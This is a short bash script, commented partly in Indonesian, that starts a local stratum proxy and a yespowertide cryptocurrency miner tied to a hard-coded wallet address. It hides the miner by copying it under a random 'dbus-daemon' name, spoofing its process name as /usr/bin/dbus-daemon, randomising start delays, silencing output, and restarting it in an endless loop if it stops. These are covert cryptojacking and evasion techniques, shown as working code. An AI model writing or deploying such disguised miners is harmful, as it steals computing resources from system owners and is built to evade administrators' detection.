#!/bin/bash

PORT=443
FAKE_NAME="dbus-daemon-$(shuf -i 100-999 -n 1)"
FAKE_PATH="/usr/local/bin/${FAKE_NAME}"

echo "Starting Proxy + Miner..."

# Jalankan proxy dengan config yaml
aiostratum-proxy -c proxy-config.yaml > proxy.log 2>&1 &

sleep 15

cp /usr/local/bin/miner "$FAKE_PATH"
chmod +x "$FAKE_PATH"

sleep $((RANDOM % 90 + 30))

echo "Launching miner..."

exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" \
  -a yespowertide \
  -o stratum+tcps://127.0.0.1:${PORT} \
  -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
  -p x \
  -t 1 \
  -B --no-color > /dev/null 2>&1 &

echo "Running with long delay..."

while true; do
    sleep $((RANDOM % 120 + 60))
    if ! pgrep -f ${FAKE_NAME} > /dev/null 2>&1; then
        sleep $((RANDOM % 60 + 30))
        exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" \
          -a yespowertide \
          -o stratum+tcps://127.0.0.1:${PORT} \
          -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
          -p x \
          -t 1 \
          -B --no-color > /dev/null 2>&1 &
    fi
done
